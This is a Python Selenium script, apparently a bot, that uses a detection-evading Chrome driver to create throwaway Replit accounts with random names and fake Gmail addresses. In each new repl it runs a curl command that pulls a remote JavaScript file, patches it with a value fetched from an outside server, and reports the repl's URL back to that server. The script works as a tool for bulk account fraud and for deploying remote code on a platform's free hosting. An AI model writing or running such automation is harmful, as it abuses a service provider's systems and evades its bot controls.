if __name__ ==  '__main__':
  import undetected_chromedriver as uc
  from selenium.webdriver import Chrome
  from selenium import webdriver
  from selenium.webdriver.common.keys import Keys
  import time
  import random
  import json
  import os
  import requests
  from selenium.webdriver.common.by import By
  options = uc.ChromeOptions()

  low_word = "abcdefghijklkmnopqrstuvwxyz"
  upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
  number = "1234567890"
  symbols = "!@#$%&*"
  username_for = low_word
  password_for = low_word + upper_word + number + symbols
  long_password = 16
  long_username = 12
  long_usernamez = 18
  #xdr = "sendelp"


  passwordrepl = "rawr12!AAc"




  options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
  options.add_argument("--window-size=1920,1080")
  options.add_argument("--remote-debugging-port=38223")
  driver = uc.Chrome(options=options, version_main=102)  # version_main allows to specify your chrome version instead of following chrome global version
  driver.set_window_size(1920, 1080)

  print("rawr")

  usernamerepl = "".join(random.sample(username_for, long_username))
  emailrepl = "".join(random.sample(username_for, long_username))+"@gmail.com"
  a = True
  az = True
  time.sleep(3)
  driver.get('https://replit.com/logout')
  driver.switch_to.window(driver.window_handles[0])
  time.sleep(1)
  driver.get('https://replit.com/signup?from=landing')
  time.sleep(3)
  driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[2]/div/input").send_keys(usernamerepl)
  time.sleep(1)
  driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[3]/div/input").send_keys(emailrepl)
  time.sleep(1)
  driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[4]/div/input").send_keys(passwordrepl)
  time.sleep(1)
  driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
  driver.window_handles[0]
  time.sleep(1)
  timez = int(time.time())+300
  while a==True:
      driver.window_handles[0]
      try:
          if(driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[5]/button/span").text=="Create account"):
              time.sleep(1)
              driver.find_element(By.XPATH,"/html/body/div/div/div[2]/main/div/form/div/div[5]/button").click()
      except:
          pass
      if(timez<int(time.time())):
          cockz
      if(driver.current_url.startswith("https://replit.com/signup")):
          time.sleep(0.4)
      else:
          a = False
  time.sleep(3)
  driver.get("https://replit.com/@replit/Nodejs?v=1")
  time.sleep(3)
  driver.execute_script("""function getElementByXpath(path){return document.evaluate(path,document,null,XPathResult.FIRST_ORDERED_NODE_TYPE,null).singleNodeValue}getElementByXpath("/html/body/div[1]/div/main/div[3]/div/div/div[2]/div/button[1]").click();""")
  time.sleep(8)
  timezz = int(time.time())+300
  while az==True:
      time.sleep(1)
      if(timezz<int(time.time())):
          cockz
      try:
          driver.find_element(By.XPATH,"/html/body/div[3]/div/div[1]/button").click()
          time.sleep(1)
          az = False
      except:
          pass
  headers = {
      'cache-control': "no-cache",
      'content-type': "application/x-www-form-urlencoded"
      }
  responsez = requests.request("GET", "https://rawrzz.nordalts.cf/gwetname", headers=headers)
  xdr = responsez.text

  time.sleep(4)
  driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[10]/div/div[2]").click()
  time.sleep(2)
  driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("curl https://raw.githubusercontent.com/awaprimPL/expert-guacamole/main/a.js -o index.js")
  driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
  driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys("sed -i 's/UNDEFINED/"+xdr+"/' index.js")
  driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[7]/div/div/div[2]/div/div[2]/div/textarea").send_keys(Keys.ENTER)
  time.sleep(1)
  driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[2]/div/div/div").click()
  time.sleep(50)

  namerepl = driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[3]/span").text
  username = driver.find_element(By.XPATH,"/html/body/div[1]/div/div/main/div[2]/div/div/div[1]/header/div/div[1]/span/div/div/div[1]/span[1]/span/a").text
  namerepl = namerepl.replace(".", "")
  tosendyez = "meow=http://"+namerepl+"."+username+".repl.co/"
  headers = {
      'cache-control': "no-cache",
      'content-type': "application/x-www-form-urlencoded"
      }
  response = requests.request("POST", "https://rawrzz.nordalts.cf/uptime", data=tosendyez, headers=headers)
  print(response.text)

